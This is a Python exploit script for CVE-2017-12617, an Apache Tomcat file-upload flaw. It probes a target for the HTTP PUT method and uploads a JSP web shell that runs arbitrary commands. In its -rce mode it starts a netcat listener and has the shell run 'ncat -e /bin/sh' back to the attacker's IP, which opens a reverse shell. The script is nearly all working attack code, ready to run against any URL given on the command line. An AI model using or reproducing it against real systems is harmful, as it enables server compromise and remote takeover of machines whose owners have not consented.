# CVE-2017-12617
# Apache Tomcat File Upload RCE
# version : Apache Tomcat 9.0.0.M1~9.0.0, 8.5.0~8.5.22, 8.0.0.RC1~8.0.46, 7.0.0~7.0.81
# version(reg) : 9\.0\.0\.M1 to 9\.0\.0|8\.5\.0 to 8\.5\.22|8\.0\.0\.RC1 to 8\.0\.46|7\.0\.0 to 7\.0\.81

import http.client
import time
import subprocess
import argparse 
import time
from threading import Thread
import os
from urllib.parse import urlparse


def Get_My_IP():
    result = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
    ip = result.stdout.strip().split()[0]
    return ip
attacker_IP = Get_My_IP()


def nc_listener():
    os.system("nc -lnvp 9001")


def exploit(cmd):
    poc = '''
    <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
    <%!
    public static String executeCmd(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\\n");
            }
            reader.close();
        } catch (Exception e) {
            output.append(e.getMessage());
        }
        return output.toString();
    }
    %>
    <%
        String result = executeCmd("'''+cmd+'''");
        out.println(result);
    %>
        '''
    return poc


def Detected_Vulnerability(URL):
    try:
        conn = http.client.HTTPConnection(URL)

        conn.request(method='OPTIONS', url='/CVE-2017-12617')
        headers = dict(conn.getresponse().getheaders())

        print("[+] Allowed methods :",headers['Allow'])

        if 'Allow' in headers and 'PUT' in headers['Allow']:
            print("[+] PUT method found")
            conn.close()

            # JSP 웹쉘 파일 업로드
            conn = http.client.HTTPConnection(URL)
            url = f"/{int(time.time())}.jsp/"


            if args.RCE:
                poc=exploit(f'ncat -e /bin/sh {attacker_IP} 9001')
                listener_thread = Thread(target=nc_listener)
                listener_thread.start()
                time.sleep(1)
            else:
                poc=exploit('id')

            conn.request(method='PUT', url=url, body=poc)

            res = conn.getresponse()
            if res.status == 201:
                print(f'[+] Malicious URL : http://{URL}{url[:-1]}')

                try:
                    conn = http.client.HTTPConnection(URL)
                    conn.request(method='GET', url=url[:-1])
                    res = conn.getresponse()

                    resp=res.read().decode('utf-8')
                    print(resp)

                    if "uid" in resp:
                        print(f"[*] Detected Vulnerability : True")
                        print("-----------------------------------")
                        return True

                    conn.close()
                except Exception as e:
                    print(f'Error while fetching the page: {e}')

                
            elif res.status == 204:
                print('[-] file exists')
                return False
            else:
                print('[-] error')
                return False

            conn.close()
        else:
            print('[-] Server not vulnerable')
            print(f"[-] Detected Vulnerability : False")
            return False

    except Exception as e:
        print(f'Error: {e}')


if __name__ == "__main__":

    print('''===============================\n        CVE-2017-12617\n Apache Tomcat File Upload RCE\n===============================''')

    parser = argparse.ArgumentParser(usage="python CVE-2017-12617.py -u <Target URL> -rce")
    parser.add_argument("-u","--URL", required=True, help='Target server URL (e.g., http://localhost:8080)')
    parser.add_argument("-rce","--RCE", required=False, help='remote code execution mode', action='store_true')
    args = parser.parse_args()


    URL=urlparse(args.URL).hostname+":"+str(urlparse(args.URL).port)

    print("[+] Target URL :",URL)

    Detected_Vulnerability(URL)